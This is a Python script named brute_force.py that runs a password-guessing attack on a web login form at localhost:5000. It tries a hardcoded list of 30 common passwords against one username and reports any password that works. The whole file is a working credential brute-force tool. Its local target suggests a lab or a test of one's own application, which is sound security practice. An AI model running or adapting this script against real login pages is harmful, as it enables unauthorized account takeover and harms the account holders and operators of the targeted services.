# brute_force.py
import requests
import time


def try_login(username, password):
    """Attempt to login with given credentials"""
    session = requests.Session()
    response = session.get("http://localhost:5000/login")

    payload = {
        'username': username,
        'password': password
    }

    response = session.post("http://localhost:5000/login", data=payload)
    return "Logged in successfully" in response.text


def brute_force_attack(username, password_list, delay=1):
    """Try each password in the list"""
    print(f"Starting brute force attack on username: {username}")
    print(f"Testing {len(password_list)} passwords...")

    start_time = time.time()
    attempts = 0

    for password in password_list:
        attempts += 1
        if attempts % 10 == 0:
            print(f"Tried {attempts} passwords...")

        if try_login(username, password):
            elapsed_time = time.time() - start_time
            print(f"\nSUCCESS! Password found after {attempts} attempts ({elapsed_time:.2f} seconds)")
            print(f"Username: {username}")
            print(f"Password: {password}")
            return password

        # Small delay to avoid overwhelming the server
        time.sleep(delay)

    print(f"\nFailed after trying {attempts} passwords")
    return None


if __name__ == "__main__":
    # Target username
    target_username = "12345678"

    # List of common passwords to try
    passwords = [
        "123456", "password", "123456789", "12345678", "12345",
        "qwerty", "abc123", "football", "1234567", "monkey",
        "111111", "letmein", "1234", "1234567890", "dragon",
        "baseball", "sunshine", "iloveyou", "trustno1", "princess",
        "admin", "welcome", "87654321", "DefaultPass123", "!QAZ2wsx",
        "password1", "qazwsx", "123qwe", "zxcvbnm", "123456a"
    ]

    # Start the attack
    brute_force_attack(target_username, passwords, delay=0.5)